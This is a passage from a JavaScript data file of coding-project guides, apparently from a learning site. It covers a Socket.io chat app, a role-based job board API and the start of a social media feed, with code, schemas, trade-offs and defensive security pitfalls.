    const room = await Room.findOne({ _id: roomId, members: userId });
    if (!room) return socket.emit('error', { message: 'Not a member' });

    socket.join(roomId);
    socket.emit('joined-room', { roomId });
  });

  socket.on('send-message', async ({ roomId, content, clientMsgId }) => {
    // clientMsgId allows client-side deduplication
    const message = await Message.create({
      roomId, senderId: userId, content, createdAt: new Date()
    });

    // Broadcast to all room members (including sender for confirmation)
    io.to(roomId).emit('new-message', {
      id: message._id,
      roomId,
      senderId: userId,
      content,
      createdAt: message.createdAt,
      clientMsgId,  // echoed back so client can replace optimistic message
    });

    // Update room's lastMessage for sidebar preview
    await Room.updateOne({ _id: roomId }, {
      $set: { 'lastMessage.content': content, 'lastMessage.sentAt': message.createdAt }
    });
  });

  socket.on('typing', ({ roomId }) => {
    socket.to(roomId).emit('user-typing', { userId, roomId });
  });

  socket.on('stop-typing', ({ roomId }) => {
    socket.to(roomId).emit('user-stop-typing', { userId, roomId });
  });
}`,
    },
    tradeoffDecisions: [
      { choice: 'MongoDB vs PostgreSQL for messages', picked: 'MongoDB', reason: 'Messages are append-only documents with a flexible readBy array. MongoDB schemaless design handles evolving message types (text, image, file, reactions) without migrations. The (roomId, createdAt) compound index gives O(log N) cursor pagination — equivalent to PostgreSQL for this workload.' },
      { choice: 'Socket.io vs raw WebSocket', picked: 'Socket.io', reason: 'Socket.io provides automatic reconnection with exponential backoff, room abstractions, namespace support, and fallback to long-polling. Raw WebSocket requires reimplementing all of this. For a project build, Socket.io saves 10-15 hours of infrastructure work.' },
      { choice: 'Presence storage: Redis vs in-memory', picked: 'Redis', reason: 'In-memory presence maps are lost on server restart and do not work across multiple server instances. Redis persists presence data and is shared across all instances, enabling horizontal scaling of the Socket.io server.' },
      { choice: 'Message pagination: offset vs cursor', picked: 'Cursor-based (createdAt)', reason: 'Offset pagination (skip N) becomes slow at large offsets — MongoDB must scan and discard N documents. Cursor pagination (WHERE createdAt < cursor) uses the index directly regardless of history depth, making it O(log N) even for rooms with 1M+ messages.' },
    ],
    deepDiveTopics: [
      { topic: 'Socket.io room internals', detail: 'Socket.io rooms are in-memory sets of socket IDs maintained per server instance. io.to(roomId).emit() iterates the set and sends to each socket. With multiple server instances, Socket.io needs a Redis adapter (socket.io-redis) so room membership is shared — otherwise users on different instances cannot receive each others messages.' },
      { topic: 'Message ordering guarantees', detail: 'TCP guarantees order for a single connection, so messages from one sender arrive in order. But two senders in the same room may interleave arbitrarily. Clients should sort messages by createdAt timestamp for display. For strict ordering, use a Lamport clock or sequence number per room, incrementing atomically in Redis (INCR room:{id}:seq).' },
      { topic: 'Typing indicator debouncing', detail: 'Naive typing indicators emit a "typing" event on every keypress — at 5 chars/second this is 5 socket events per second per user. With 50 users typing simultaneously, the server receives 250 events/second just for presence. Debounce client-side: emit typing on first keypress, set a 1-second timer. If another keypress arrives before the timer fires, reset the timer. Only emit stop-typing when the timer actually fires.' },
      { topic: 'Horizontal scaling with Redis adapter', detail: 'A single Socket.io server handles ~10K concurrent connections. To scale beyond this, run multiple instances behind a load balancer with sticky sessions (or not, since Socket.io handles reconnection). Install @socket.io/redis-adapter: io.adapter(createAdapter(pubClient, subClient)). All instances share room membership via Redis Pub/Sub, so io.to(roomId).emit() works across instances.' },
    ],
    commonPitfalls: [
      { pitfall: 'Not authenticating Socket.io connections', why: 'Without auth middleware on the Socket.io handshake, any client can connect and join any room, send messages as any user, and read private conversations.', solution: 'Add auth middleware: io.use((socket, next) => { const token = socket.handshake.auth.token; verifyJWT(token, (err, user) => { if (err) return next(new Error("Unauthorized")); socket.userId = user.id; next(); }); })' },
      { pitfall: 'Broadcasting to rooms without membership check', why: 'socket.join(roomId) without verifying the user is a member allows any authenticated user to subscribe to any room\'s messages.', solution: 'Always verify membership before join: const room = await Room.findOne({ _id: roomId, members: socket.userId }). Reject with an error event if the check fails.' },
      { pitfall: 'Memory leak from unremoved event listeners', why: 'Registering socket.on() handlers inside React useEffect without cleanup causes multiple duplicate handlers to accumulate across re-renders, leading to duplicate messages and memory leaks.', solution: 'Return a cleanup function from useEffect: return () => { socket.off("new-message", handler); }. Or use socket.once() for one-time handlers.' },
      { pitfall: 'Sending full message history on reconnect', why: 'On reconnect, fetching all messages since account creation sends megabytes of data and blocks the UI for seconds.', solution: 'Track the timestamp of the last received message per room in localStorage. On reconnect, fetch only messages since that timestamp using the cursor pagination endpoint.' },
    ],
    edgeCases: [
      { scenario: 'User in the same room on two devices', impact: 'Socket.io associates one socket per connection, not per user. Messages sent to the room reach both sockets correctly, but read receipts and typing state may conflict.', mitigation: 'Track all socket IDs per user (store in Redis as a set: user:{id}:sockets). When marking messages as read, update readBy for the user, not the socket. Both sockets receive the read-receipt event.' },
      { scenario: 'Server crash with in-flight messages', impact: 'Messages emitted just before crash may be received by some room members but not persisted to MongoDB, causing inconsistent state.', mitigation: 'Persist the message to MongoDB before broadcasting it. Accept the slight latency increase. For critical messages, clients can implement an acknowledgement pattern (socket emit with callback) and retry on timeout.' },
      { scenario: 'MongoDB replica set failover during message write', impact: 'Primary steps down; writes fail for 10-30 seconds during election, returning write errors to active senders.', mitigation: 'Wrap message writes in try/catch and emit an error event back to the sender: socket.emit("message-failed", { clientMsgId, reason: "Server error, please retry" }). The client can show a retry button.' },
      { scenario: 'Thundering herd on reconnect after server restart', impact: 'All connected clients reconnect simultaneously, overwhelming the server with auth and room-join requests.', mitigation: 'Socket.io client uses exponential backoff with jitter by default (reconnectionDelay, reconnectionDelayMax options). This naturally spreads reconnect attempts over time. Do not override these defaults.' },
    ],
    interviewFollowups: [
      { question: 'How would you scale this to 1M concurrent users?', answer: 'Run multiple Socket.io instances behind a load balancer with the Redis adapter for shared room state. Use Redis Cluster for the presence and adapter layer. Shard MongoDB by roomId for message storage. Add a CDN/edge layer for static assets. At 1M users across 100 server instances, each handles ~10K connections — well within Socket.io single-instance limits.' },
      { question: 'How would you implement end-to-end encryption?', answer: 'Use the Signal Protocol (libsignal). Each user generates a key pair on device; public keys are registered with the server. On first message to a user, fetch their public key and perform a Diffie-Hellman key exchange to derive a shared secret. Messages are encrypted client-side before sending — the server stores and forwards ciphertext and never sees plaintext.' },
      { question: 'How would you handle message search across all rooms?', answer: 'MongoDB text indexes work but do not scale past ~1M messages. For production-scale search, sync messages to Elasticsearch using a MongoDB change stream. Elasticsearch provides full-text search with relevance ranking, room-level ACL filtering, and sub-100ms query response across billions of messages.' },
      { question: 'How would you add push notifications for offline users?', answer: 'On disconnect, mark the user as offline in Redis. When a message is sent to a room, check which members are offline. For offline members, enqueue a push notification job. Use Firebase Cloud Messaging (FCM) for mobile and Web Push API for browsers. Store FCM tokens in the users collection, registered when the client first loads.' },
    ],
    extensionIdeas: [
      { idea: 'Message Reactions', difficulty: 'beginner', description: 'Add emoji reactions to messages: store reactions as a Map of emoji to array of user IDs on the Message document. Emit reaction-added/removed socket events. Show reaction counts below each message with a click-to-toggle interaction.' },
      { idea: 'File and Image Sharing', difficulty: 'intermediate', description: 'Generate an S3 presigned upload URL via POST /api/files/upload-url. Client uploads directly to S3. Send the resulting S3 URL as a message with type: "image" or "file". Render image messages inline and file messages as download cards.' },
      { idea: 'Message Threading', difficulty: 'intermediate', description: 'Add a parentMessageId field to support reply threads. Show a "X replies" indicator on threaded messages. Clicking opens a thread panel alongside the main chat. Threads are their own cursor-paginated message stream filtered by parentMessageId.' },
      { idea: 'Voice Messages', difficulty: 'advanced', description: 'Use the MediaRecorder Web API to record audio in the browser. Upload the WebM blob to S3 via presigned URL. Send as a message with type: "audio" and a duration field. Render a waveform player using Web Audio API with a playback progress bar.' },
    ],
  },
  {
    id: 'job-board-api',
    title: 'Job Board API',
    icon: 'briefcase',
    color: '#0284c7',
    difficulty: 'intermediate',
    estimatedTime: '5-7 hours',
    techStack: ['Express', 'PostgreSQL', 'JWT', 'React', 'Tailwind CSS'],
    questions: 4,
    description: 'Build a REST API for a job board with authentication, role-based access (employer/candidate), job CRUD, application flow, and admin panel.',
    introduction: 'Create a complete job board backend and frontend. Employers post jobs, candidates browse and apply, admins moderate. Implement JWT auth with role-based permissions, pagination, search, and application state machine (applied → reviewed → interviewed → offered → rejected).',
    interviewRelevance: 'Tests REST API design, authentication/authorization, role-based access control, database schema design with relationships, and state machine implementation. Common full-stack take-home for startup roles.',
    learningObjectives: [
      'Design a REST API with proper resource naming, pagination, and filtering',
      'Implement JWT authentication with role-based middleware (employer, candidate, admin)',
      'Build an application state machine with valid transitions and audit trail',
      'Create a search system with full-text search across job title, description, and company',
    ],
    keyQuestions: [
      { question: 'What should the API design look like?', answer: 'Resources: /api/jobs (CRUD), /api/jobs/:id/applications (list/create), /api/applications/:id (update status), /api/auth (login/register/refresh), /api/users/me (profile). Use query params for filtering: /api/jobs?location=remote&type=full-time&search=react&page=1&limit=20.' },
      { question: 'How do I implement role-based access?', answer: 'JWT payload includes role: "employer" | "candidate" | "admin". Middleware checks: requireRole("employer") for creating jobs, requireRole("candidate") for applying, requireRole("admin") for moderation. Employers can only edit/delete their own jobs. Candidates can only view their own applications.' },
      { question: 'How should the application state machine work?', answer: 'States: applied → screening → interviewing → offered → accepted | rejected. Only employers can advance the state. Each transition is logged in an application_events table (application_id, from_state, to_state, note, created_at). Invalid transitions return 422 Unprocessable Entity.' },
      { question: 'What database schema should I use?', answer: 'Tables: users (id, email, password_hash, role, name, profile_data), companies (id, name, logo, owner_id FK), jobs (id, company_id FK, title, description, location, salary_range, type, status, created_at), applications (id, job_id FK, candidate_id FK, status, resume_url, cover_letter, created_at), application_events (id, application_id FK, from_state, to_state, note, created_at).' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Auth & User Roles',
        description: 'Set up Express, PostgreSQL schema, JWT auth with role-based access.',
        tasks: [
          'Initialize Express project with pg, bcrypt, jsonwebtoken, express-validator',
          'Create PostgreSQL tables: users, companies, jobs, applications, application_events',
          'Build POST /api/auth/register (accepts role: employer|candidate) and POST /api/auth/login',
          'Create JWT middleware: authenticate() validates token, requireRole("employer") gates routes',
          'Add POST /api/companies for employers to create their company profile',
        ],
      },
      {
        phase: 2,
        title: 'Jobs API',
        description: 'Build full CRUD for job listings with search and filtering.',
        tasks: [
          'POST /api/jobs: employer-only, validate required fields, insert with company_id from JWT',
          'GET /api/jobs: public endpoint with query params (search, location, type, page, limit)',
          'Add PostgreSQL full-text search: tsvector column on title + description, GIN index',
          'PUT /api/jobs/:id: employer-only, verify company ownership before update',
          'DELETE /api/jobs/:id: soft-delete (set status=closed) rather than hard delete',
        ],
      },
      {
        phase: 3,
        title: 'Application State Machine',
        description: 'Build application submission flow and employer-driven status transitions.',
        tasks: [
          'POST /api/jobs/:id/applications: candidate-only, enforce one application per job per user',
          'GET /api/jobs/:id/applications: employer-only, list all applications for their job',
          'PATCH /api/applications/:id/status: employer advances state with transition validation',
          'Log every transition to application_events table with from_state, to_state, note, timestamp',
          'GET /api/applications/mine: candidate view of all their own applications with current status',
        ],
      },
      {
        phase: 4,
        title: 'React Frontend',
        description: 'Build the job board UI for candidates and the employer dashboard.',
        tasks: [
          'Build public job listings page with search bar, location/type filter dropdowns, and pagination',
          'Build job detail page with apply button that opens a modal (cover letter + resume URL)',
          'Build employer dashboard: list of posted jobs with application count badges',
          'Build application review panel: list of applicants with status dropdown and notes input',
          'Add candidate My Applications page showing job title, company, current status, and timeline',
        ],
      },
    ],
    fileStructure: `job-board-api/
├── server/
│   ├── src/
│   │   ├── routes/
│   │   │   ├── auth.js          # POST /api/auth/register, /login, /refresh
│   │   │   ├── jobs.js          # GET/POST /api/jobs, GET/PUT/DELETE /api/jobs/:id
│   │   │   ├── applications.js  # POST /api/jobs/:id/applications, PATCH /api/applications/:id/status
│   │   │   ├── companies.js     # POST/GET /api/companies
│   │   │   └── users.js         # GET /api/users/me, PUT /api/users/me
│   │   ├── middleware/
│   │   │   ├── auth.js          # authenticate(), requireRole(role)
│   │   │   └── validate.js      # express-validator chains per route
│   │   ├── services/
│   │   │   ├── search.js        # full-text search query builder
│   │   │   └── stateMachine.js  # valid transition map + transition validator
│   │   ├── db/
│   │   │   ├── pool.js
│   │   │   └── migrate.js       # CREATE TABLE IF NOT EXISTS on startup
│   │   └── index.js
│   ├── .env
│   └── package.json
├── client/
│   ├── src/
│   │   ├── pages/
│   │   │   ├── JobsPage.jsx         # public job listings with search/filter
│   │   │   ├── JobDetailPage.jsx    # job detail + apply modal
│   │   │   ├── EmployerDashboard.jsx
│   │   │   └── MyApplicationsPage.jsx
│   │   ├── components/
│   │   │   ├── JobCard.jsx
│   │   │   ├── ApplicationRow.jsx
│   │   │   └── StatusBadge.jsx
│   │   ├── contexts/
│   │   │   └── AuthContext.jsx  # role-aware auth context
│   │   └── App.jsx
│   └── vite.config.js
└── docker-compose.yml`,
    architectureLayers: [
      { name: 'React Client', description: 'Role-aware SPA. Candidates see job listings and applications; employers see their posted jobs and application pipelines. Routes protected by role checks in the auth context.' },
      { name: 'Express API Layer', description: 'RESTful API with JWT auth middleware and role-based route guards. Validates all inputs via express-validator before touching the database.' },
      { name: 'Auth Middleware', description: 'authenticate() verifies JWT and attaches req.user. requireRole("employer") checks the role claim. Resource ownership checked inline: employers can only modify their own jobs.' },
      { name: 'Full-Text Search', description: 'PostgreSQL tsvector on jobs(title, description, company_name). GIN index enables sub-10ms keyword search across 100K listings. Built-in, no external search service needed.' },
      { name: 'Application State Machine', description: 'stateMachine.js defines valid transitions: applied→screening, screening→interviewing, interviewing→offered, any→rejected. Invalid transitions return 422. Every valid transition is logged to application_events.' },
      { name: 'PostgreSQL', description: 'Relational schema with proper FK constraints and indexes. Five tables: users, companies, jobs, applications, application_events. Parameterized queries throughout — no raw string interpolation.' },
    ],
    dataModel: {
      description: 'Relational schema modeling the employer-candidate relationship with a full application audit trail.',
      schema: `CREATE TABLE users (
  id            SERIAL PRIMARY KEY,
  email         TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  role          VARCHAR(10) NOT NULL CHECK (role IN ('employer','candidate','admin')),
  full_name     TEXT,
  created_at    TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE companies (
  id          SERIAL PRIMARY KEY,
  name        TEXT NOT NULL,
  website     TEXT,
  logo_url    TEXT,
  description TEXT,
  owner_id    INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  created_at  TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE jobs (
  id           SERIAL PRIMARY KEY,
  company_id   INTEGER NOT NULL REFERENCES companies(id) ON DELETE CASCADE,
  title        TEXT NOT NULL,
  description  TEXT NOT NULL,
  location     TEXT,
  salary_min   INTEGER,
  salary_max   INTEGER,
  type         VARCHAR(20) CHECK (type IN ('full-time','part-time','contract','internship')),
  status       VARCHAR(10) DEFAULT 'open' CHECK (status IN ('open','closed','draft')),
  search_vec   TSVECTOR,
  created_at   TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_jobs_search ON jobs USING GIN(search_vec);
CREATE INDEX idx_jobs_status  ON jobs(status);

CREATE TABLE applications (
  id            SERIAL PRIMARY KEY,
  job_id        INTEGER NOT NULL REFERENCES jobs(id) ON DELETE CASCADE,
  candidate_id  INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  status        VARCHAR(20) DEFAULT 'applied',
  resume_url    TEXT,
  cover_letter  TEXT,
  created_at    TIMESTAMPTZ DEFAULT NOW(),
  UNIQUE (job_id, candidate_id)
);

CREATE TABLE application_events (
  id              SERIAL PRIMARY KEY,
  application_id  INTEGER NOT NULL REFERENCES applications(id) ON DELETE CASCADE,
  from_state      VARCHAR(20),
  to_state        VARCHAR(20) NOT NULL,
  note            TEXT,
  actor_id        INTEGER REFERENCES users(id),
  created_at      TIMESTAMPTZ DEFAULT NOW()
);`,
    },
    apiDesign: {
      description: 'REST API with role-based access. Public endpoints for browsing; protected endpoints for employers and candidates. All write endpoints validate inputs.',
      endpoints: [
        { method: 'POST', path: '/api/auth/register', response: '{ token, user: { id, email, role } }' },
        { method: 'GET', path: '/api/jobs?search=&location=&type=&page=&limit=', response: '{ jobs: [...], total, page, limit }' },
        { method: 'POST', path: '/api/jobs', response: '{ id, title, companyId, status, createdAt } — employer only' },
        { method: 'PUT', path: '/api/jobs/:id', response: '{ id, title, ... updated fields } — employer, own job only' },
        { method: 'POST', path: '/api/jobs/:id/applications', response: '{ id, jobId, candidateId, status: "applied" } — candidate only' },
        { method: 'GET', path: '/api/jobs/:id/applications', response: 'Array of applications with candidate profile — employer, own job only' },
        { method: 'PATCH', path: '/api/applications/:id/status', response: '{ id, status, updatedAt } — employer only, validates state transition' },
        { method: 'GET', path: '/api/applications/mine', response: 'Array of applications with job and company info — candidate only' },
      ],
    },
    codeExamples: {
      javascript: `// server/src/services/stateMachine.js
const TRANSITIONS = {
  applied:      ['screening', 'rejected'],
  screening:    ['interviewing', 'rejected'],
  interviewing: ['offered', 'rejected'],
  offered:      ['accepted', 'rejected'],
};

export function isValidTransition(fromState, toState) {
  return TRANSITIONS[fromState]?.includes(toState) ?? false;
}

// server/src/routes/applications.js — status update handler
router.patch('/:id/status', authenticate, requireRole('employer'), async (req, res) => {
  const { status, note } = req.body;
  const { id } = req.params;

  const { rows } = await pool.query(
    \`SELECT a.*, j.company_id FROM applications a
     JOIN jobs j ON a.job_id = j.id
     WHERE a.id = $1\`,
    [id]
  );

  if (!rows.length) return res.status(404).json({ error: 'Application not found' });

  const app = rows[0];

  // Verify employer owns the job this application belongs to
  const company = await pool.query(
    'SELECT id FROM companies WHERE id = $1 AND owner_id = $2',
    [app.company_id, req.user.id]
  );
  if (!company.rows.length) return res.status(403).json({ error: 'Forbidden' });

  // Validate state transition
  if (!isValidTransition(app.status, status)) {
    return res.status(422).json({
      error: \`Invalid transition: \${app.status} -> \${status}\`
    });
  }

  // Update status and log the event atomically
  await pool.query('BEGIN');
  await pool.query('UPDATE applications SET status = $1 WHERE id = $2', [status, id]);
  await pool.query(
    \`INSERT INTO application_events (application_id, from_state, to_state, note, actor_id)
     VALUES ($1, $2, $3, $4, $5)\`,
    [id, app.status, status, note || null, req.user.id]
  );
  await pool.query('COMMIT');

  res.json({ id: Number(id), status, updatedAt: new Date() });
});`,
    },
    tradeoffDecisions: [
      { choice: 'Full-text search implementation', picked: 'PostgreSQL tsvector with GIN index', reason: 'Adding Elasticsearch for a job board take-home is over-engineered and adds infrastructure complexity. PostgreSQL built-in full-text search handles 100K listings at sub-10ms with a GIN index. Use Elasticsearch only when you outgrow PostgreSQL FTS (10M+ documents or need relevance tuning).' },
      { choice: 'Application state transitions', picked: 'Server-side state machine with explicit transition map', reason: 'Allowing arbitrary status updates from the client would let employers set status to any value, corrupting the audit trail. A server-side transition map enforces that only valid progressions are allowed and logs every change, creating a defensible audit trail.' },
      { choice: 'Role storage in JWT vs DB', picked: 'Role in JWT payload', reason: 'Fetching role from DB on every request adds a DB round trip to every authenticated endpoint. Role rarely changes — storing it in the JWT (signed, tamper-proof) is safe and fast. On role change (e.g., user upgraded to employer), invalidate existing JWTs via a short expiry (1h access token, 30d refresh token).' },
      { choice: 'Soft delete vs hard delete for jobs', picked: 'Soft delete (status=closed)', reason: 'Hard-deleting a job cascades to delete all its applications, destroying the candidate audit trail. Employers may want to re-open a job or review past applicants. Soft-delete preserves history while hiding the job from public listings.' },
    ],
    deepDiveTopics: [
      { topic: 'PostgreSQL full-text search with tsvector', detail: 'tsvector is a preprocessed document representation: to_tsvector("english", title || " " || description) normalizes words to lexemes and removes stop words. A GIN index on this column enables fast @@ (matches) queries. Rank results with ts_rank(search_vec, query). For multi-language support, pass the language parameter explicitly rather than using the server default.' },
      { topic: 'JWT refresh token rotation', detail: 'Access tokens should have short expiry (15min-1h) to limit damage from leakage. Refresh tokens (30 days) are stored in httpOnly cookies and used to issue new access tokens. On each refresh, rotate the refresh token (issue a new one, invalidate the old). Store refresh tokens in a DB table to enable logout-everywhere and detect token theft (if a token is used twice, revoke the family).' },
      { topic: 'Application state machine design', detail: 'Model states and transitions explicitly: const TRANSITIONS = { applied: ["screening","rejected"], screening: ["interviewing","rejected"] ... }. Never model this as a free-form status column with no validation — employers will corrupt data by sending arbitrary values. Returning 422 Unprocessable Entity on invalid transitions makes the constraint explicit to API consumers.' },
      { topic: 'Pagination: offset vs keyset', detail: 'Offset pagination (LIMIT 20 OFFSET 200) scans and discards 200 rows on every page-2 request. With 100K jobs, page 5000 scans 100K rows. Keyset pagination (WHERE created_at < :cursor ORDER BY created_at DESC LIMIT 20) uses the index directly regardless of page depth. Use keyset for infinite-scroll job feeds; offset is acceptable for small datasets with numbered pagination UI.' },
    ],
    commonPitfalls: [
      { pitfall: 'Not checking resource ownership on update/delete', why: 'An employer can update or delete any job if the route only checks the employer role without verifying company ownership. This allows one employer to sabotage a competitor\'s listings.', solution: 'After authenticating the employer, query: SELECT id FROM jobs WHERE id = $1 AND company_id IN (SELECT id FROM companies WHERE owner_id = $2). Return 403 if not found.' },
      { pitfall: 'Allowing duplicate applications', why: 'Without a UNIQUE constraint, a candidate can apply to the same job multiple times. Duplicate applications confuse employers and clutter the pipeline.', solution: 'Add UNIQUE(job_id, candidate_id) to the applications table. On insert, catch pg error 23505 and return 409 Conflict with the message "You have already applied to this job."' },
      { pitfall: 'Storing role in a mutable user table column without re-issuing JWTs', why: 'If a user\'s role changes in the DB but their JWT still claims the old role, they retain old permissions until their token expires.', solution: 'Use short-lived access tokens (15-60min). On role change, optionally add the user ID to a JWT blocklist checked during verification. The blocklist can be a Redis set with TTL matching the token expiry.' },
      { pitfall: 'Returning password hashes in API responses', why: 'SELECT * FROM users returns password_hash. If any endpoint accidentally returns the full user object, password hashes leak to clients.', solution: 'Always explicitly list columns: SELECT id, email, role, full_name FROM users. Never SELECT * on the users table in application code. Add a toJSON() sanitizer that strips sensitive fields.' },
    ],
    edgeCases: [
      { scenario: 'Employer deletes a job with active applications', impact: 'Cascading delete removes all application history. Candidates who applied have no record of their application. Application events are permanently lost.', mitigation: 'Use soft delete: SET status = \'closed\'. Only hard-delete after a retention period (e.g., 90 days). Notify candidates via email when a job they applied to is closed.' },
      { scenario: 'Two candidates apply at the same moment (race condition)', impact: 'Both inserts succeed without the UNIQUE constraint, creating duplicate applications.', mitigation: 'UNIQUE(job_id, candidate_id) at the DB level is the correct guard. The constraint is enforced transactionally by PostgreSQL regardless of concurrent inserts. No application-level locking needed.' },
      { scenario: 'Employer account deleted with active job listings', impact: 'ON DELETE CASCADE propagates to companies, then jobs, then applications — wiping all candidate application history.', mitigation: 'Use ON DELETE SET NULL or a soft-delete pattern for employers. Archive rather than delete accounts. Require admin action to remove employer accounts with active listings.' },
      { scenario: 'Job search returning irrelevant results', impact: 'A search for "React" returns every job containing the word "react" in any context (even in rejection emails stored in descriptions), reducing result quality.', mitigation: 'Use tsquery with lexeme matching: plainto_tsquery("english", $1). Add salary range and recency filters. Let candidates save searches and get email alerts on new matches.' },
    ],
    interviewFollowups: [
      { question: 'How would you add email notifications for application status changes?', answer: 'On each status transition, enqueue a notification job (BullMQ or pg-boss). The worker picks up the job, fetches candidate email and job title from DB, and sends via SendGrid/Resend. This decouples the HTTP response from the email send — the status update completes in <10ms regardless of email delivery latency.' },
      { question: 'How would you implement a resume parsing feature?', answer: 'Accept PDF uploads via presigned S3 URL. After upload, enqueue a parsing job. The worker sends the PDF to a resume parsing API (Affinda, Sovren, or a custom Python service using pdfminer + spaCy NER). Parse out name, email, skills, and work history. Store structured data in a candidate_profiles table. Surface it in the employer application view.' },
      { question: 'How would you handle job listing deduplication from multiple scrapers?', answer: 'Add a content_hash column to jobs: MD5(company_id || title || location || type). Enforce UNIQUE(content_hash). When importing from scrapers, use INSERT ... ON CONFLICT(content_hash) DO UPDATE SET updated_at = NOW(). This deduplicates identical listings while updating stale ones.' },
      { question: 'How would you scale the search to millions of jobs?', answer: 'PostgreSQL FTS works up to ~1M jobs before query times exceed 100ms even with GIN indexes. Beyond that, add Elasticsearch: sync jobs via a change-data-capture stream (Debezium on PostgreSQL WAL) into an Elasticsearch index. Elasticsearch handles relevance ranking, faceted search (by location, salary, type), and auto-suggest on job titles at scale.' },
    ],
    extensionIdeas: [
      { idea: 'Saved Jobs and Email Alerts', difficulty: 'beginner', description: 'Add a saved_jobs junction table (user_id, job_id). Let candidates bookmark listings. Add a daily cron job that checks saved search queries against new postings and sends digest emails via SendGrid.' },
      { idea: 'Company Reviews and Ratings', difficulty: 'intermediate', description: 'Add a company_reviews table (user_id, company_id, rating 1-5, review_text, created_at). Show aggregate rating and review count on company pages. Require one verified application to that company before allowing a review, preventing spam.' },
      { idea: 'Applicant Tracking System (ATS) Kanban', difficulty: 'intermediate', description: 'Build a drag-and-drop Kanban board for employers to manage applications. Columns map to application stages. Dragging a card between columns fires the PATCH /api/applications/:id/status endpoint. Implemented with @dnd-kit/core.' },
      { idea: 'Salary Insights Dashboard', difficulty: 'advanced', description: 'Aggregate anonymized salary data from posted jobs by role, location, and company size. Build a salary comparison chart showing percentiles. This is the core value proposition of Levels.fyi and Glassdoor salary features.' },
    ],
  },
  {
    id: 'social-media-feed',
    title: 'Social Media Feed',
    icon: 'users',
    color: '#8b5cf6',
    difficulty: 'advanced',
    estimatedTime: '8-10 hours',
    techStack: ['React', 'Node.js', 'PostgreSQL', 'Redis', 'Tailwind CSS'],
    questions: 4,
    description: 'Build a Twitter/Instagram-style social feed with infinite scroll, likes, comments, follow system, and real-time updates.',
    introduction: 'Create a social media timeline. Users create posts (text + images), follow other users, like and comment on posts, and see a personalized feed. Implement infinite scroll with cursor-based pagination, optimistic like/unlike, and a follow-based feed algorithm.',
    interviewRelevance: 'The "design a social media feed" question comes up in nearly every system design interview. Actually building one demonstrates you understand: fan-out strategies, feed generation, denormalization, caching, and real-time updates.',
    learningObjectives: [
      'Implement a fan-out-on-write feed system using Redis sorted sets',
      'Build infinite scroll with cursor-based pagination and intersection observer',
      'Create an optimistic like/unlike system with rollback on failure',
      'Design a follow graph and use it to generate personalized timelines',
    ],
    keyQuestions: [
      { question: 'Fan-out-on-write vs fan-out-on-read?', answer: 'Fan-out-on-write: when a user posts, push the post ID to all followers\' feed caches (Redis sorted sets). Fast reads, slow writes. Fan-out-on-read: when a user loads their feed, query all followed users\' posts and merge. Slow reads, fast writes. Hybrid: fan-out-on-write for users with <10K followers, fan-out-on-read for celebrities.' },
      { question: 'How do I implement infinite scroll?', answer: 'Use Intersection Observer on a sentinel element at the bottom of the feed. When visible, fetch the next page using cursor-based pagination (WHERE created_at < :lastPostTimestamp ORDER BY created_at DESC LIMIT 20). Maintain a "loading" state to prevent duplicate fetches. Prepend new posts to the top with a "New posts" banner.' },
      { question: 'How should likes work?', answer: 'Optimistic update: increment count and toggle heart immediately on click. Send POST /api/posts/:id/like in background. On failure, rollback the UI state. Store likes in a junction table (user_id, post_id, created_at) with a unique constraint. Cache like counts in Redis (INCR/DECR) for fast reads.' },
      { question: 'What database schema is needed?', answer: 'Tables: users, posts (id, user_id, content, image_url, like_count, comment_count, created_at), likes (user_id, post_id — composite PK), comments (id, post_id, user_id, content, created_at), follows (follower_id, following_id — composite PK). Indexes: posts.user_id + created_at for user profile, follows.follower_id for feed generation.' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Backend Core — Posts, Users, Follows',
        description: 'Set up Express, PostgreSQL schema, auth, and the follow graph.',
        tasks: [
          'Initialize Node.js/Express project with pg, bcrypt, jsonwebtoken, multer, ioredis',
          'Create PostgreSQL tables: users, posts, likes, comments, follows with indexes',
          'Build JWT auth: POST /api/auth/register and /login',
          'Build POST /api/users/:id/follow and DELETE /api/users/:id/follow',
          'Build POST /api/posts with optional image upload (multer to S3 presigned URL)',
        ],
      },
      {
        phase: 2,
        title: 'Feed Generation with Redis Fan-out',
        description: 'Implement fan-out-on-write feed using Redis sorted sets.',
        tasks: [
          'On post creation, fetch all follower IDs from follows table (WHERE following_id = userId)',
          'For each follower, ZADD feed:{followerId} {timestamp} {postId} in Redis',
          'GET /api/feed: ZREVRANGE feed:{userId} 0 19 to get latest 20 post IDs, then batch-fetch posts from PostgreSQL',
          'Handle cursor pagination: ZREVRANGEBYSCORE feed:{userId} {cursor} -inf LIMIT 0 20',
          'Cap feed size: ZREMRANGEBYRANK feed:{userId} 0 -1001 to keep only the latest 1000 items per user',
        ],
      },
      {
        phase: 3,
        title: 'Likes, Comments & Real-time Updates',
        description: 'Build optimistic like/unlike, comment threads, and Socket.io notifications.',
        tasks: [
          'POST /api/posts/:id/like and DELETE /api/posts/:id/like with unique constraint enforcement',
          'Cache like counts in Redis (INCR/DECR post:likes:{postId}) for fast reads',
          'POST /api/posts/:id/comments: insert comment, increment post.comment_count',
          'Add Socket.io for real-time like/comment notifications to the post author',
          'Build GET /api/users/:id/posts for profile page with cursor pagination',
        ],
      },
      {
        phase: 4,
        title: 'React Feed UI',
        description: 'Build the infinite-scroll feed, post composer, and profile pages.',
        tasks: [
          'Build PostCard component with image, like button (optimistic toggle), comment count',
          'Implement infinite scroll with IntersectionObserver on a sentinel div at feed bottom',
          'Build post composer: textarea with image upload preview and character counter',
          'Build UserProfile page showing posts grid and follower/following counts',
          'Add a "New posts" banner that appears when new posts arrive via Socket.io',
        ],
      },
    ],
    fileStructure: `social-media-feed/
├── server/
│   ├── src/
│   │   ├── routes/
│   │   │   ├── auth.js          # POST /api/auth/register, /login
│   │   │   ├── feed.js          # GET /api/feed (personalized), GET /api/explore
│   │   │   ├── posts.js         # POST/GET/DELETE /api/posts, likes, comments
│   │   │   └── users.js         # GET /api/users/:id, follow/unfollow
│   │   ├── services/
│   │   │   ├── feedService.js   # fan-out on write, feed Redis ops
│   │   │   ├── likeService.js   # like/unlike with Redis counter cache
│   │   │   └── upload.js        # S3 presigned URL generation
│   │   ├── socket/
